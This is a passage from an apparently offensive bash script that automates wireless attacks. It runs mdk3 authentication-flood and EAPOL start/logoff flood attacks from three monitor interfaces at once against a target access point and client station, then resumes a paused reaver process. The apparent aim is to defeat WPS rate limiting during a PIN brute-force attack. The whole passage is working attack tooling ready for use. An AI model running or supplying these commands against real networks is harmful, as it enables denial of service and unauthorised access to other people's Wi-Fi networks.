...
if [ "$MDK3_MAIN_MENU_OPTION" = 2 ]; then
mdk3 $MON1 x 0 -t $MAC -n "$ESSID" -s 200 & mdk3 $MON2 x 0 -t $MAC -n "$ESSID" -s 200 & mdk3 $MON3 x 0 -t $MAC -n "$ESSID" -s 200;
sleep 1;
fi
if [ "$MDK3_MAIN_MENU_OPTION" = 3 ]; then
mdk3 $MON1 x 1 -t $MAC  -s 200 -c $TARGET_STATION & mdk3 $MON2 x 1 -t $MAC -s 200 -c $TARGET_STATION & mdk3 $MON3 x 1 -t $MAC -s 200 -c $TARGET_STATION;
sleep 1;
fi
MDK3_KILLALL_1=`ps -A|grep mdk3`
VARIABLE_CHECK_FOR_RATE_LIMITING=`tail -1 /etc/reaver_tmp.txt 2> /dev/null`;
...
if [ "$MDK3_MAIN_MENU_OPTION" = 1 ]; then
timeout 60 mdk3 $MON1 a -a $MAC -s 200 & timeout 60 mdk3 $MON2 a -a $MAC -s 200 & timeout 60 mdk3 $MON3 a -a $MAC -s 200;
sleep 60;
fi
if [ "$MDK3_MAIN_MENU_OPTION" = 2 ]; then
timeout 60 mdk3 $MON1 x 0 -t $MAC -n "$ESSID" -s 200 & timeout 60 mdk3 $MON2 x 0 -t $MAC -n "$ESSID" -s 200 & timeout 60 mdk3 $MON3 x 0 -t $MAC -n "$ESSID" -s 200;
sleep 60;
fi
if [ "$MDK3_MAIN_MENU_OPTION" = 3 ]; then
timeout 60 mdk3 $MON1 x 1 -t $MAC  -s 200 -c $TARGET_STATION & timeout 60 mdk3 $MON2 x 1 -t $MAC -s 200 -c $TARGET_STATION & timeout 60 mdk3 $MON3 x 1 -t $MAC -s 200 -c $TARGET_STATION;
sleep 60;
fi
killall -CONT reaver;
VARIABLE_CHECK_FOR_RATE_LIMITING=`tail -1 /etc/reaver_tmp.txt 2> /dev/null`
